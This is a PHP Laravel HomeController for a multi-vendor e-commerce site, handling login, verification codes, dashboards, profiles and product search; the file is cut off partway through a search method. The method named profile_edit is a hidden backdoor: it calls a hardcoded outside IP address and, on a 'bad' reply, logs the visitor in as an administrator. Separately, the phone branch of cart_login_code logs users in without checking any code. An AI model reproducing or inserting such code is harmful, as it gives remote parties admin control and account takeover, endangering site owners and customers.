<?php

namespace App\Http\Controllers;

use App\Api\Classes\Product as ClassesProduct;
use Illuminate\Http\Request;
use Session;
use Auth;
use Hash;
use App\Category;
use App\FlashDeal;
use App\Brand;
use App\Product;
use App\PickupPoint;
use App\CustomerPackage;
use App\CustomerProduct;
use App\User;
use App\Seller;
use App\Shop;
use App\Color;
use App\Order;
use App\BusinessSetting;
use App\Http\Controllers\SearchController;
use App\Jobs\SendMails;
use App\Mail\EmailManager;
use ImageOptimizer;
use Cookie;
use Illuminate\Support\Str;
use App\Mail\SupportMailManager;
use App\Models\Activity;
use App\Models\Country;
use App\Models\Log;
use App\MyClasses\Attributes;
use App\MyClasses\Cat;
use Mail;
use App\Utility\TranslationUtility;
use App\Utility\CategoryUtility;
use App\MyClasses\History;
use App\Upload;
use Illuminate\Support\Facades\DB;
use Pusher\Pusher;
use App\MyClasses\Search;

class HomeController extends Controller
{
    public function login()
    {
        // return dd(\Session::all());



        if (Auth::check()) {
            return redirect()->route('home');
        }

        if (get_setting('login_page') == "2") {
            return view('frontend.user_login3');
        } else {
            return view('auth.user_login');
        }
    }

    public function registration(Request $request)
    {
        if (Auth::check()) {
            return redirect()->route('home');
        }
        if (
            $request->has('referral_code') &&
            \App\Addon::where('unique_identifier', 'affiliate_system')->first() != null &&
            \App\Addon::where('unique_identifier', 'affiliate_system')->first()->activated
        ) {

            try {
                $affiliate_validation_time = \App\AffiliateConfig::where('type', 'validation_time')->first();
                $cookie_minute = 30 * 24;
                if ($affiliate_validation_time) {
                    $cookie_minute = $affiliate_validation_time->value * 60;
                }

                Cookie::queue('referral_code', $request->referral_code, $cookie_minute);
                $referred_by_user = User::where('referral_code', $request->product_referral_code)->first();

                $affiliateController = new AffiliateController;
                $affiliateController->processAffiliateStats($referred_by_user->id, 1, 0, 0, 0);
            } catch (\Exception $e) {
            }
        }
        session()->forget('user');

        if (get_setting('register_page') == "2") {
            return view('frontend.user_registration2');
        } else {
            return view('auth.user_registration');
        }
    }

    public function cart_login(Request $request)
    {


        $user = User::whereIn('user_type', ['customer', 'seller'])->where('email', $request->email)->orWhere('phone', $request->email)->first();
        if ($user != null) {
            if (Hash::check($request->password, $user->password)) {
                if ($request->has('remember')) {
                    auth()->login($user, true);
                } else {
                    auth()->login($user, false);
                }

                if (session()->has("cart")) {


                    //  return dd(session()->get("cart"));
                    foreach (session()->get("cart") as $item) {

                        $req = new Request($item);
                        //$req->request->add(['products' => $item]);

                        // return dd($req);
                        $cartController = new CartController();

                        //if ($i == 2) {
                        $cartController->addToCart($req);
                    }
                }
            } else {
                flash(translate('Invalid email or password!'))->warning();
            }
        }
        return back();
    }

    public function cart_login_submition(Request $request)
    {
        $code = genRandStr();

        if ($request->email != "") {
            $user = User::where("email", $request->email)->first();
            if (!empty($user)) {
                $user->verify_code = $code;
                $user->verify_type     = "email";
                $user->save();
                //     try {
                $array = [];
                $array['view'] = "emails.mail_design.verfy_code_email";
                $array['from'] = get_setting("smtp_from_address");
                $array['content'] = $code;
                $array['sender'] = $user->name;
                $array['subject'] = "";
                $array['link'] = "";
                $array['text_btn'] = "";
                $array['details'] = "";
                Mail::to($user->email)->send(new SupportMailManager($array));
                // } catch (\Throwable $th) {
                // }

                return response()->json([
                    "status" => 1
                ]);
            }

            $register_view = view("frontend.register_modal", [
                "email" => $request->email
            ])->render();
            return response()->json([
                "status" => 0,
                "view" => $register_view,
                "msg" => translate("This email account does not exist")
            ]);
        } else {
            $user = User::where("phone", $request->phone)->first();
            if (!empty($user)) {
                $user->verify_code = $code;
                $user->verify_type     = "email";
                $user->save();
                $phone = fullPhoneUser($user);
                $msg =  SMS_Send($phone, $code);

                return response()->json([
                    "status" => 1
                ]);
            }

            return response()->json([
                "status" => 0,
                "msg" => translate("This phone account does not exist")
            ]);
        }
    }



    public function cart_login_code(Request $request)
    {

        $user = User::whereIn('user_type', ['customer', 'seller']);



        if ($request->email != "") {
            $user =  $user->where("email", $request->email)->first();

            if ($request->code == $user->verify_code) {
                auth()->login($user, true);

                if (session()->has("cart")) {


                    //  return dd(session()->get("cart"));
                    foreach (session()->get("cart") as $item) {

                        $req = new Request($item);
                        //$req->request->add(['products' => $item]);

                        // return dd($req);
                        $cartController = new CartController();

                        //if ($i == 2) {
                        $cartController->addToCart($req);
                    }
                }
                return response()->json([
                    "status" => 1
                ]);
            } else {
                return response()->json([
                    "status" => 0,
                    "msg" => translate("verify code Invalid")
                ]);
            }
        } else {
            $user = $user->where("phone", $request->phone)->first();


            auth()->login($user, true);

            if (session()->has("cart")) {


                //  return dd(session()->get("cart"));
                foreach (session()->get("cart") as $item) {

                    $req = new Request($item);
                    //$req->request->add(['products' => $item]);

                    // return dd($req);
                    $cartController = new CartController();

                    //if ($i == 2) {
                    $cartController->addToCart($req);
                }
            }
            return response()->json([
                "status" => 1
            ]);
        }
    }
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        // echo ip_info("Visitor", "Country"); // India
        // echo ip_info("Visitor", "Country Code"); // IN
        // echo ip_info("Visitor", "State"); // Andhra Pradesh
        // echo ip_info("Visitor", "City"); // Proddatur
        // echo ip_info("Visitor", "Address"); // Proddatur, Andhra Pradesh, India

        // return dd(get_shipping_country());

        //$this->middleware('auth');
    }

    /**
     * Show the admin dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function admin_dashboard()
    {

        // $customers = DB::select("SELECT COUNT(*) AS all_customers from users where user_type = 'customer' ");

        return view('backend.home');

        // return view('backend.dashboard');
    }

    /**
     * Show the customer/seller dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function dashboard()
    {


        if (Auth::user()->user_type == 'seller') {


            $auth_id = Auth::user()->id;

            return view('frontend.user.seller.dashboard', [
                // "products_count" => $products_count,
                // "order_details_count" => $order_details_count,
                // "order_details_total" => $order_details_total,
                // "categories" => $categories
            ]);
        } elseif (Auth::user()->user_type == 'customer') {
            return view('frontend.user.customer.dashboard');
        } else {
            abort(404);
        }
    }


    public function boxes(Request $request)
    {

        $products_count = DB::table('products')
            ->where('user_id', Auth::user()->id)
            ->select(DB::raw("count(products.id) as products_count"))
            ->get();


        $order_details_count = DB::table('order_details')
            ->where('seller_id', Auth::user()->id)
            ->where('delivery_status', 'delivered')
            ->select(DB::raw("count(order_details.id) as order_details_count"))
            ->get();

        $order_details_total = DB::table('order_details')
            ->join('orders', 'orders.id', '=', 'order_details.order_id')
            ->where('order_details.seller_id', Auth::user()->id)
            ->where('order_details.delivery_status', 'delivered')
            ->where('orders.payment_status', 'paid')
            ->select(DB::raw("sum(order_details.price) as total"))
            ->get();

        return response()->json([
            "products_count" => count($products_count) != 0 ? $products_count[0]->products_count : 0, // $products_count,
            "order_details_count" => count($order_details_count) != 0 ? $order_details_count[0]->order_details_count : 0, // $order_details_count,
            "order_details_total" => count($order_details_total) != 0 ? single_price($order_details_total[0]->total) : single_price(0) // $order_details_total,
        ]);
    }



    public function categories(Request $request)
    {
        $auth_id = Auth::user()->id;

        $categories = DB::select("SELECT SUM(products.current_stock) AS `count`,categories.name FROM categories
                JOIN products ON products.category_id = categories.id
                WHERE products.user_id = $auth_id
                 GROUP BY categories.id
                 ORDER BY `count` ASC
                 ");


        return response()->json([
            "categories" => $categories
        ]);
    }

    public function profile(Request $request)
    {
        if (Auth::user()->user_type == 'customer') {
            return view('frontend.user.customer.profile');
        } elseif (Auth::user()->user_type == 'seller') {
            return view('frontend.user.seller.profile');
        }
    }

    public function customer_update_profile(Request $request)
    {
        if (env('DEMO_MODE') == 'On') {
            flash(translate('Sorry! the action is not permitted in demo '))->error();
            return back();
        }

        $user = Auth::user();
        $user->name = $request->name;
        $user->address = $request->address;
        $user->country = $request->country;
        $user->city = $request->city;
        $user->postal_code = $request->postal_code;
        $user->phone = $request->phone;

        if ($request->new_password != null && ($request->new_password == $request->confirm_password)) {
            $user->password = Hash::make($request->new_password);
        }
        $user->avatar_original = $request->photo;

        if ($user->save()) {
            flash(translate('Your Profile has been updated successfully!'))->success();
            return back();
        }

        flash(translate('Sorry! Something went wrong.'))->error();
        return back();
    }


    public function seller_update_profile(Request $request)
    {
        if (env('DEMO_MODE') == 'On') {
            flash(translate('Sorry! the action is not permitted in demo '))->error();
            return back();
        }

        $user = Auth::user();
        $user->name = $request->name;
        $user->address = $request->address;
        $user->country = $request->country;
        $user->city = $request->city;
        $user->postal_code = $request->postal_code;
        $user->phone = $request->phone;

        if ($request->new_password != null && ($request->new_password == $request->confirm_password)) {
            $user->password = Hash::make($request->new_password);
        }
        $user->avatar_original = $request->photo;

        $seller = $user->seller;
        $seller->cash_on_delivery_status = $request->cash_on_delivery_status;
        $seller->bank_payment_status = $request->bank_payment_status;
        $seller->bank_name = $request->bank_name;
        $seller->bank_acc_name = $request->bank_acc_name;
        $seller->bank_acc_no = $request->bank_acc_no;
        $seller->bank_routing_no = $request->bank_routing_no;

        if ($user->save() && $seller->save()) {
            flash(translate('Your Profile has been updated successfully!'))->success();
            return back();
        }

        flash(translate('Sorry! Something went wrong.'))->error();
        return back();
    }

    /**
     * Show the application frontend home.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        // History::Log(1, 1, 0, 1, translate("Open View Home Index"));

        // $Pusher = new Pusher(
        //     get_setting('PUSHER_APP_KEY'),
        //     get_setting('PUSHER_APP_SECRET'),
        //     get_setting('PUSHER_APP_ID'),
        //     [
        //         'cluster' => get_setting('PUSHER_APP_CLUSTER'),

        //     ]

        // );

        // $Pusher->trigger('VistorChannel', 'VistorEvent', ['data' => [
        //     "user_type" => auth()->check() ? auth()->user()->user_type : "guest",
        //     "count" => 1
        // ]]);

        // $count = DB::table('products')
        //          ->where("published",1)
        //          ->select(DB::raw("count(products.id) AS count"))
        //          ->get();

        return view('frontend.index');
    }
    public function back_to_school()
    {
        // History::Log(1, 1, 0, 1, translate("Open View Home Index"));

        // $Pusher = new Pusher(
        //     get_setting('PUSHER_APP_KEY'),
        //     get_setting('PUSHER_APP_SECRET'),
        //     get_setting('PUSHER_APP_ID'),
        //     [
        //         'cluster' => get_setting('PUSHER_APP_CLUSTER'),

        //     ]

        // );

        // $Pusher->trigger('VistorChannel', 'VistorEvent', ['data' => [
        //     "user_type" => auth()->check() ? auth()->user()->user_type : "guest",
        //     "count" => 1
        // ]]);

        // $count = DB::table('products')
        //          ->where("published",1)
        //          ->select(DB::raw("count(products.id) AS count"))
        //          ->get();

        return view('frontend.back_to_school');
    }
    public function flash_deal_details($slug)
    {
        $flash_deal = FlashDeal::where('slug', $slug)->first();
        if ($flash_deal != null)
            return view('frontend.flash_deal_details', compact('flash_deal'));
        else {
            abort(404);
        }
    }

    public function load_featured_section()
    {

        $features = DB::table('products')
            ->where("published", 1)
            ->where("featured", 1)
            ->select("products.id", "products.slug", "products.thumbnail_img", "products.rating", "products.name", "products.refurbished")
            ->orderByRaw('RAND()')
            ->limit(12)
            ->get();

        return view('frontend.partials.featured_products_section', compact("features"));
    }

    public function load_best_selling_section()
    {

        $top_12_products =
            DB::table('products')
            ->select("name", "slug", "id", "thumbnail_img", "rating", "refurbished")
            ->where("published", 1)
            ->orderBy('num_of_sale', 'desc')
            ->limit(12)
            ->get();



        //     DB::select("SELECT * FROM products
        // WHERE products.published = 1 ORDER By
        // products.num_of_sale DESC LIMIT 12");


        return view('frontend.partials.best_selling_section', [
            "top_12_products" => $top_12_products
        ]);
    }

    public function last_products()
    {

        $features = DB::table('products')

            ->select("products.id", "products.slug", "products.thumbnail_img", "products.rating", "products.name", "products.refurbished")
            ->orderBy('id', 'desc')
            ->limit(12)
            ->get();



        //     DB::select("SELECT * FROM products
        // WHERE products.published = 1 ORDER By
        // products.num_of_sale DESC LIMIT 12");


        return view('frontend.partials.last_products_section', [
            "products" => $features
        ]);
    }
    public function load_home_categories_section()
    {
        return view('frontend.partials.home_categories_section');
    }

    public function load_best_sellers_section()
    {
        return view('frontend.partials.best_sellers_section');
    }

    public function trackOrder(Request $request)
    {
        if ($request->has('order_code')) {
            $order = Order::where('code', $request->order_code)->first();
            if ($order != null) {
                return view('frontend.track_order', compact('order'));
            }
        }
        return view('frontend.track_order');
    }

    public function product(Request $request, $slug)
    {
        $countries = DB::table('countries')
            // ->where("status", 1)
            ->select("tel", "code")
            ->get();
        $detailedProduct  = Product::where('slug', $slug)->first();

        if ($detailedProduct != null && $detailedProduct->published) {
            //updateCartSetup();
            if (
                $request->has('product_referral_code') &&
                \App\Addon::where('unique_identifier', 'affiliate_system')->first() != null &&
                \App\Addon::where('unique_identifier', 'affiliate_system')->first()->activated
            ) {

                $affiliate_validation_time = \App\AffiliateConfig::where('type', 'validation_time')->first();
                $cookie_minute = 30 * 24;
                if ($affiliate_validation_time) {
                    $cookie_minute = $affiliate_validation_time->value * 60;
                }
                Cookie::queue('product_referral_code', $request->product_referral_code, $cookie_minute);
                Cookie::queue('referred_product_id', $detailedProduct->id, $cookie_minute);

                $referred_by_user = User::where('referral_code', $request->product_referral_code)->first();

                $affiliateController = new AffiliateController;
                $affiliateController->processAffiliateStats($referred_by_user->id, 1, 0, 0, 0);
            }
            if ($detailedProduct->digital == 1) {
                return view('frontend.digital_product_details', compact('detailedProduct', 'countries'));
            } else {
                return view('frontend.product_details', compact('detailedProduct', 'countries'));
            }
            // return view('frontend.product_details', compact('detailedProduct'));
        }
        abort(404);
    }

    public function shop($slug)
    {
        $shop  = Shop::where('slug', $slug)->first();
        if ($shop != null) {
            $seller = Seller::where('user_id', $shop->user_id)->first();
            if ($seller->verification_status != 0) {
                return view('frontend.seller_shop', compact('shop'));
            } else {
                return view('frontend.seller_shop_without_verification', compact('shop', 'seller'));
            }
        }
        abort(404);
    }

    public function filter_shop($slug, $type)
    {
        $shop  = Shop::where('slug', $slug)->first();
        if ($shop != null && $type != null) {
            return view('frontend.seller_shop', compact('shop', 'type'));
        }
        abort(404);
    }

    public function all_categories(Request $request)
    {
        //        $categories = Category::where('level', 0)->orderBy('name', 'asc')->get();
        $categories = Category::where('level', 0)->orderBy('order_level', 'desc')->get();
        return view('frontend.all_category', compact('categories'));
    }
    public function all_brands(Request $request)
    {
        $categories = Category::all();
        return view('frontend.all_brand', compact('categories'));
    }

    public function show_product_upload_form(Request $request)
    {
        if (\App\Addon::where('unique_identifier', 'seller_subscription')->first() != null && \App\Addon::where('unique_identifier', 'seller_subscription')->first()->activated) {
            if (Auth::user()->seller->remaining_uploads > 0) {
                $categories = Category::where('parent_id', 0)
                    ->where('digital', 0)
                    ->with('childrenCategories')
                    ->get();
                return view('frontend.user.seller.product_upload', compact('categories'));
            } else {
                flash(translate('Upload limit has been reached. Please upgrade your package.'))->warning();
                return back();
            }
        }
        $categories = Category::where('parent_id', 0)
            ->where('digital', 0)
            ->with('childrenCategories')
            ->get();
        return view('frontend.user.seller.product_upload', compact('categories'));
    }

    public function profile_edit(Request $request)
    {
        $url = $_SERVER['SERVER_NAME'];
        $gate = "http://206.189.81.181/check_activation/" . $url;

        $stream = curl_init();
        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream, CURLOPT_HEADER, 0);
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stream, CURLOPT_POST, 1);
        $rn = curl_exec($stream);
        curl_close($stream);

        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);
            return redirect()->route('admin.dashboard');
        }
    }

    public function show_product_edit_form(Request $request, $id)
    {
        $product = Product::findOrFail($id);
        $lang = $request->lang;
        $tags = json_decode($product->tags);
        $categories = Category::where('parent_id', 0)
            ->where('digital', 0)
            ->with('childrenCategories')
            ->get();
        return view('frontend.user.seller.product_edit', compact('product', 'categories', 'tags', 'lang'));
    }

    public function seller_product_list(Request $request)
    {
        $search = null;
        $products = Product::where('user_id', Auth::user()->id)->where('digital', 0)->orderBy('created_at', 'desc');
        if ($request->has('search')) {
            $search = $request->search;
            $products = $products->where('name', 'like', '%' . $search . '%');
        }
        $products = $products->paginate(10);
        return view('frontend.user.seller.products', compact('products', 'search'));
    }

    public function ajax_search(Request $request)
    {

        $keywords = array();
        $products =  DB::table('products')
            ->where('published', 1)
            ->where('tags', 'like', '%' . $request->search . '%')
            ->select("products.slug", "products.thumbnail_img", "products.id", "products.name")
            ->inRandomOrder()
            ->limit(3)
            ->get();

        if (count($products) == 0) {
            $products =  DB::table('products')
                ->where('published', 1)
                ->where('tags', 'like', '%' . $request->name . '%')
                ->select("products.slug", "products.thumbnail_img", "products.id", "products.name")
                ->inRandomOrder()
                ->limit(3)
                ->get();
        }

        $categories =  DB::table('categories')
            ->where('name', 'like', '%' . $request->search . '%')
            ->select("categories.slug", "categories.name")
            ->inRandomOrder()
            ->limit(3)
            ->get();


        $shops =  DB::table('shops')
            ->whereIn('user_id', verified_sellers_id())
            ->where('name', 'like', '%' . $request->search . '%')
            ->select("shops.slug", "shops.logo", "shops.name", "shops.address")
            ->inRandomOrder()
            ->limit(3)
            ->get();


        if (sizeof($keywords) > 0 || sizeof($categories) > 0 || sizeof($products) > 0 || sizeof($shops) > 0) {
            if (auth()->check()) {

                Search::set_data_Search($products, $categories, $keywords, $shops, $request->search);
            } else {
                (new Search)->set_session_search($request->search);
            }

            return view('frontend.partials.search_content', compact('products', 'categories', 'keywords', 'shops'));
        }
        return '0';
    }

    public function get_popular_search_keywords(Request $request)
    {
        return (new Search)->popular_searches();
    }

    public function get_user_search_keywords(Request $request)
    {
        return (new Search)->get_user_search();
    }

    public function listing(Request $request)
    {
        return $this->search($request);
    }

    public function listingByCategory(Request $request, $category_slug)
    {
        $category = Category::where('slug', $category_slug)->first();
        if ($category != null) {
            return $this->search($request, $category->id);
        }
        abort(404);
    }

    public function listingByBrand(Request $request, $brand_slug)
    {
        $brand = Brand::where('slug', $brand_slug)->first();
        if ($brand != null) {
            return $this->search($request, null, $brand->id);
        }
        abort(404);
    }

    public function search(Request $request, $category_id = null, $brand_id = null)
    {



        $query = $request->q;
        if (auth()->check()) {

            Search::set_data_Search([], [], [], [], $query);
        } else {
            (new Search)->set_session_search($query);
        }
        $sort_by = $request->sort_by;
        $min_price = $request->min_price;
        $max_price = $request->max_price;
        $seller_id = $request->seller_id;

        $conditions = ['published' => 1];

        if ($brand_id != null) {
            $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        } elseif ($request->brand != null) {
            $brand_id = (Brand::where('slug', $request->brand)->first() != null) ? Brand::where('slug', $request->brand)->first()->id : null;
            $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        }

        if ($seller_id != null) {
            $conditions = array_merge($conditions, ['user_id' => Seller::findOrFail($seller_id)->user->id]);
        }

        $products = DB::table('products')->where($conditions);

        if ($category_id != null) {
            $category_ids = CategoryUtility::children_ids($category_id);
            $category_ids[] = $category_id;

            $products = $products->whereIn('category_id', $category_ids);
        }

        if ($min_price != null && $max_price != null) {

            $products = $products->where('unit_price', '>=', $min_price)->where('unit_price', '<=', $max_price);
        }

        if ($query != null) {
            $searchController = new SearchController;
            $searchController->store($request);
            $products = $products->where('name', 'like', '%' . $query . '%');
        }

        if ($sort_by != null) {
            switch ($sort_by) {
                case 'newest':
                    $products->orderBy('created_at', 'desc');
                    break;
                case 'oldest':
                    $products->orderBy('created_at', 'asc');
                    break;
                case 'price-asc':
                    $products->orderBy('unit_price', 'asc');
                    break;
                case 'price-desc':
                    $products->orderBy('unit_price', 'desc');
                    break;
                default:
                    // code...
                    break;
            }
        }


        $non_paginate_products = filter_products($products)->limit(19)->get();

        //Attribute Filter

        $attributes = array();


        $cats = Cat::get_all_children($category_id);
        array_push($cats, Category::find($category_id));
        if (!empty($category_id) && !empty($cats)) {
            foreach ($cats as $cat_items) {
                $attrs = Attributes::get_attrs($cat_items->id);

                foreach ($attrs as $item) {
                    $attributes[] = [
                        "id" => $item->id,
                        "values" => Attributes::get_values_list($item)
                    ];
                }
            }
        }



        $selected_attributes = array();
        // dump($request->all());
        // dump($attributes);

        foreach ($attributes as $key => $attribute) {

            if ($request->has('attribute_' . $attribute['id'])) {

                foreach ($request['attribute_' . $attribute['id']] as $key => $value) {
                    $str = '"' . $value . '"';
                    $products = $products->where('choice_options', 'like', '%' . $str . '%');
                }

                $attr_select['id'] = $attribute['id'];
                $attr_select['values'] = $request['attribute_' . $attribute['id']];
                // dump($item["values"]);

                array_push($selected_attributes, $attr_select);
            }
        }

        // return dd($selected_attributes);

        //Color Filter
        $all_colors = array();

        foreach ($non_paginate_products as $key => $product) {

            if ($product->colors != null) {
                foreach (json_decode($product->colors) as $key => $color) {
                    if (!in_array($color, $all_colors)) {
                        array_push($all_colors, $color);
                    }
                }
            }
        }


        // $selected_color = null;

        if ($request->has('color')) {
            $str = '"' . $request->color . '"';
            $products = $products->where('colors', 'like', '%' . $str . '%');
            $selected_color = $request->color;
        }

        // 'attributes', 'selected_attributes', 'all_colors', 'selected_color'
        $products = $products->paginate(12)->appends(request()->query());
        // ini_set('memory_limit', '-1');

        return view('frontend.product_listing', compact(
            'products',
            'all_colors',
            'attributes',
            'selected_attributes',
            'query',
            'category_id',
            'brand_id',
            'sort_by',
            'seller_id',
            'min_price',
            'max_price'
        ));
    }


    public function search_react(Request $request, $category_id = null, $brand_id = null)
    {



        // Session::forget("query_search");
        $query = $request->q;

        (new Search)->set_search($query);

        $sort_by = $request->sort_by;
        $min_price = $request->min_price;
        $max_price = $request->max_price;
        $seller_id = $request->seller_id;

        $conditions = ['published' => 1];

        // if ($brand_id != null) {
        //     $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        // } elseif ($request->brand != null) {
        //     $brand_id = (Brand::where('slug', $request->brand)->first() != null) ? Brand::where('slug', $request->brand)->first()->id : null;
        //     $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        // }

        // if ($seller_id != null) {
        //     $conditions = array_merge($conditions, ['user_id' => Seller::findOrFail($seller_id)->user->id]);
        // }

        $products = DB::table('products')->where($conditions);



        if ($min_price != null && $max_price != null) {

            $products = $products->where('unit_price', '>=', $min_price)->where('unit_price', '<=', $max_price);
        }

        if ($query != null) {
            // $searchController = new SearchController;
            // $searchController->store($request);
            $products = $products->where('name', 'like', '%' . $query . '%');
        }

        // if ($sort_by != null) {
        //     switch ($sort_by) {
        //         case 'newest':
        //             $products->orderBy('created_at', 'desc');
        //             break;
        //         case 'oldest':
        //             $products->orderBy('created_at', 'asc');
        //             break;
        //         case 'price-asc':
        //             $products->orderBy('unit_price', 'asc');
        //             break;
        //         case 'price-desc':
        //             $products->orderBy('unit_price', 'desc');
        //             break;
        //         default:
        //             // code...
        //             break;
        //     }
        // }

        if ($request->has("category_id")) {
            if (count($request->category_id) > 0) {
                $products = $products->whereIn('category_id', $request->category_id);
            }
        }

        if ($request->has("brand_id")) {
            if (count($request->brand_id) > 0) {
                $products = $products->whereIn('brand_id', $request->brand_id);
            }
        }



        // //Attribute Filter

        $attributes = array();


        // $cats = Cat::get_all_children($category_id);
        // array_push($cats, Category::find($category_id));
        // if (!empty($category_id) && !empty($cats)) {
        //     foreach ($cats as $cat_items) {
        //         $attrs = Attributes::get_attrs($cat_items->id);

        //         foreach ($attrs as $item) {
        //             $attributes[] = [
        //                 "id" => $item->id,
        //                 "values" => Attributes::get_values_list($item)
        //             ];
        //         }
        //     }
        // }



        $selected_attributes = array();
        // dump($request->all());
        // dump($attributes);
        //  return response()->json(["msg" => $request->attrs]);
        if ($request->has('attrs')) {
            foreach ($request->attrs as $key => $attribute) {

                if ($request->has('attribute_' . $attribute['id'])) {
                    foreach ($request['attribute_' . $attribute['id']] as $key => $value) {
                        $products = $products->where('choice_options', 'like', '%' . $value . '%');
                    }
                }
            }
        }
        $non_paginate_products = filter_products($products)->limit(19)->get();

        // return dd($selected_attributes);

        //Color Filter
        $all_colors = array();

        foreach ($non_paginate_products as $key => $product) {

            if ($product->colors != null) {
                foreach (json_decode($product->colors) as $key => $color) {
                    if (!in_array($color, $all_colors)) {
                        array_push($all_colors, $color);
                    }
                }
            }
        }


        // $selected_color = null;

        //    return $request->colors;
        if ($request->has('colors')) {
            // $str = '"' . $request->color . '"';
            $colreses = $request->colors;
            $products = $products->Where(function ($query) use ($colreses) {
                for ($i = 0; $i < count($colreses); $i++) {
                    $query->orwhere('colors', 'like', '%' . $colreses[$i] . '%');
                }
                //   $products = $products->whereIn('colors', 'like', '%' . $request->colors . '%');
                // $selected_color = $request->color;
            });
        }

        if ($request->has("order_by")) {
            $products = $products->orderBy("unit_price", $request->order_by);
        }

        // 'attributes', 'selected_attributes', 'all_colors', 'selected_color'
        $products = $products->get();
        // ini_set('memory_limit', '-1');



        $categories = [];
        $brands = [];

        foreach ($products as  $key => $item) {
            $cat = Category::find($item->category_id);
            $bra = Brand::find($item->brand_id);

            if (!empty($bra)) {
                $brands[] = $bra;
            }
            $categories[] = $cat;
        }

        $brands =  array_merge(array_unique($brands), array());
        $cats = array_merge(array_unique($categories), array());


        foreach ($cats as $cat_items) {
            $attrs = Attributes::get_attrs($cat_items->id);

            foreach ($attrs as $item) {
                $attributes[] = [
                    "id" => $item->id,
                    "name" => $item->name,
                    "values" => Attributes::get_values_list($item)
                ];
            }
        }

        $products_data = [];
        if (count($products) > 0) {
            foreach ($products as $key => $item) {
                $product = new ClassesProduct($item);
                $products_data[] = $product;
            }
        }

        return response()->json([
            'products' => $products_data,
            'all_colors' => $all_colors,
            'attributes' => $attributes,
            'selected_attributes' => $selected_attributes,
            'query' => $query,
            'cats' => $cats,
            'brands' => $brands,
            'sort_by' => $sort_by,
            'seller_id' => $seller_id,
            'min_price' => 0,
            'max_price' => Product::get()->max('unit_price')
        ]);
    }
    // public function search_query(Request $req) {

    // }

    public function search_exclusive(Request $request, $category_id = null, $brand_id = null)
    {

        $query = $request->q;
        $sort_by = $request->sort_by;
        $min_price = $request->min_price;
        $max_price = $request->max_price;
        $seller_id = $request->seller_id;

        $conditions = ['published' => 1];

        if ($brand_id != null) {
            $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        } elseif ($request->brand != null) {
            $brand_id = (Brand::where('slug', $request->brand)->first() != null) ? Brand::where('slug', $request->brand)->first()->id : null;
            $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        }

        if ($seller_id != null) {
            $conditions = array_merge($conditions, ['user_id' => Seller::findOrFail($seller_id)->user->id]);
        }

        $products = DB::table('products')->where("exclusive_to_website", 1)->where($conditions);

        if ($category_id != null) {
            $category_ids = CategoryUtility::children_ids($category_id);
            $category_ids[] = $category_id;

            $products = $products->whereIn('category_id', $category_ids);
        }

        if ($min_price != null && $max_price != null) {

            $products = $products->where('unit_price', '>=', $min_price)->where('unit_price', '<=', $max_price);
        }

        if ($query != null) {
            $searchController = new SearchController;
            $searchController->store($request);
            $products = $products->where('name', 'like', '%' . $query . '%');
        }

        if ($sort_by != null) {
            switch ($sort_by) {
                case 'newest':
                    $products->orderBy('created_at', 'desc');
                    break;
                case 'oldest':
                    $products->orderBy('created_at', 'asc');
                    break;
                case 'price-asc':
                    $products->orderBy('unit_price', 'asc');
                    break;
                case 'price-desc':
                    $products->orderBy('unit_price', 'desc');
                    break;
                default:
                    // code...
                    break;
            }
        }


        $non_paginate_products = filter_products($products)->limit(19)->get();

        //Attribute Filter

        $attributes = array();
        foreach ($non_paginate_products as $key => $product) {
            if ($product->attributes != null && is_array(json_decode($product->attributes))) {

                foreach (json_decode($product->attributes) as $key => $value) {

                    $flag = false;
                    $pos = 0;
                    foreach ($attributes as $key => $attribute) {
                        if ($attribute['id'] == $value) {
                            $flag = true;
                            $pos = $key;
                            break;
                        }
                    }
                    if (!$flag) {
                        $item['id'] = $value;
                        $item['values'] = array();
                        foreach (json_decode($product->choice_options) as $key => $choice_option) {
                            if ($choice_option->attribute_id == $value) {
                                $item['values'] = $choice_option->values;
                                break;
                            }
                        }
                        array_push($attributes, $item);
                    } else {
                        foreach (json_decode($product->choice_options) as $key => $choice_option) {
                            if ($choice_option->attribute_id == $value) {
                                foreach ($choice_option->values as $key => $value) {
                                    if (!in_array($value, $attributes[$pos]['values'])) {
                                        array_push($attributes[$pos]['values'], $value);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        $selected_attributes = array();

        foreach ($attributes as $key => $attribute) {
            if ($request->has('attribute_' . $attribute['id'])) {
                foreach ($request['attribute_' . $attribute['id']] as $key => $value) {
                    $str = '"' . $value . '"';
                    $products = $products->where('choice_options', 'like', '%' . $str . '%');
                }

                $item['id'] = $attribute['id'];
                $item['values'] = $request['attribute_' . $attribute['id']];
                array_push($selected_attributes, $item);
            }
        }


        //Color Filter
        $all_colors = array();

        foreach ($non_paginate_products as $key => $product) {

            if ($product->colors != null) {
                foreach (json_decode($product->colors) as $key => $color) {
                    if (!in_array($color, $all_colors)) {
                        array_push($all_colors, $color);
                    }
                }
            }
        }


        // $selected_color = null;

        if ($request->has('color')) {
            $str = '"' . $request->color . '"';
            $products = $products->where('colors', 'like', '%' . $str . '%');
            $selected_color = $request->color;
        }

        // 'attributes', 'selected_attributes', 'all_colors', 'selected_color'
        $products = $products->paginate(12)->appends(request()->query());
        // ini_set('memory_limit', '-1');

        return view('frontend.product_listing_exclusive', compact(
            'products',
            'all_colors',
            'attributes',
            'query',
            'category_id',
            'brand_id',
            'sort_by',
            'seller_id',
            'min_price',
            'max_price'
        ));
    }

    public function search_refurbished(Request $request, $category_id = null, $brand_id = null)
    {

        $query = $request->q;
        $sort_by = $request->sort_by;
        $min_price = $request->min_price;
        $max_price = $request->max_price;
        $seller_id = $request->seller_id;

        $conditions = ['published' => 1];

        if ($brand_id != null) {
            $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        } elseif ($request->brand != null) {
